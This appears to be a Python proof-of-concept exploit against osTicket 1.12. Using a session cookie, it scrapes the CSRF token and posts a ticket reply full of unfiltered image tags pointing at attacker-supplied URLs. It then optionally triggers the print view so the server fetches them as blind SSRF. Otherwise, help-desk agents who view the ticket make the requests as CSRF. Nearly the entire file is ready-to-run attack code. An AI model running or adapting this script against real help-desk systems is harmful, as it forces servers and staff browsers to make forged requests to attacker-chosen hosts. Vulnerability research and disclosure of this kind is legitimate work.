#!/usr/bin/python3

################################################################
#
# This script can perform both a blind SSRF attack or leave a
# CSRF payload for an agent to run. Since the URL for images
# aren't filtered, any link can be inserted in. This means that
# any agent that shows the image can have an arbitrary GET
# request made on their behalf, and if the ticket is printed,
# the server calls the URL (blind SSRF).
# 
# Note - this was tested on Debian 11 with osTicket 1.12
# (https://github.com/osTicket/osTicket/releases)
# 
# Example: python3 osticketRF.py -d https://my.domain.com
#              -f ~/links.txt -a ssrf -t 12 -s dq0pi20bhn1gk...
#
# Use the command `python3 osticketRF.py -h` for help.
# 
################################################################


### IMPORTS ###
import requests, argparse
from bs4 import BeautifulSoup



### ARGUMENT PARSING ###
parser = argparse.ArgumentParser()
parser.add_argument('-d', "--domain", type=str, required=True, help="osTicket domain, example - https://os.ticket.com")
parser.add_argument('-f', "--file", type=str, required=True, help="Text file of links for the victim to contact, example link - https://malicious.com:80/path?param=value")
parser.add_argument('-a', "--attack", type=str, required=True, help="Attack to perform (ssrf or csrf, case insensitive)")
parser.add_argument('-t', "--ticket", type=int, required=True, help="Ticket ID to comment on, example - 4")
parser.add_argument('-s', "--session", type=str, required=True, help="Include the value for the OSTSESSID cookie")
args = parser.parse_args()

# open file of links
try:
    file = open(args.file, "r")
    links = file.read().split("\n")
except:
    print("[-] Error opening file",args.file)
    quit()

# check for invalid attack
if args.attack.lower() != "ssrf" and args.attack.lower() != "csrf":
    print("[-] Invalid attack, must be ssrf or csrf")
    quit()



### GET CSRF VALUE ###
print("[+] Getting CSRF token...")
URL = args.domain+"/tickets.php?id="+str(args.ticket)
headers = {}
headers["Cookie"] = "OSTSESSID="+args.session

# make request
try:
    result = requests.request("GET", URL, headers=headers)
except Exception as e:
    print("[-] Error making request")
    print(e)
    quit()

# parse CSRF token value
html = BeautifulSoup(result.text, "html.parser")
if "To best assist you, we request that you be specific and detailed" not in result.text:
    print("[-] Ticket information could not be found. Please ensure the ticket ID and session cookie values are correct.")
    quit()
CSRF_TOKEN = html.find_all("input", {"name":"__CSRFToken__"})[0]["value"]



### SEND PAYLOAD(S) ###
print("[+] Sending payload(s)...")
headers["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundaryltXLvbGiK9BmMcDm"
payload = f"""------WebKitFormBoundaryltXLvbGiK9BmMcDm\r\nContent-Disposition: form-data; name="__CSRFToken__"\r\n\r\n{CSRF_TOKEN}\r\n------WebKitFormBoundaryltXLvbGiK9BmMcDm\r\nContent-Disposition: form-data; name="id"\r\n\r\n{args.ticket}\r\n------WebKitFormBoundaryltXLvbGiK9BmMcDm\r\nContent-Disposition: form-data; name="a"\r\n\r\nreply\r\n------WebKitFormBoundaryltXLvbGiK9BmMcDm\r\nContent-Disposition: form-data; name="message"\r\n\r\n"""

for link in links:
    payload += f"<img src=\"{link}\">"

payload += """\r\n------WebKitFormBoundaryltXLvbGiK9BmMcDm\r\nContent-Disposition: form-data; name="draft_id"\r\n\r\n\r\n------WebKitFormBoundaryltXLvbGiK9BmMcDm--"""

# make request
try:
    result = requests.request("POST", URL, headers=headers, data=payload)
except Exception as e:
    print("[-] Error making request")
    print(e)
    quit()



### PRINT IF SSRF ###
if args.attack.lower() == "ssrf":
    print("[+] Printing ticket...")
    PRINT_URL = args.domain+"/tickets.php?a=print&id="+str(args.ticket)
    try:
        result = requests.request("GET", PRINT_URL, headers=headers)
        print("[+] SSRF has been exploited")
    except Exception as e:
        print("[-] Error making request")
        print(e)
        quit()
else:
    print("[+] CSRF has been exploited")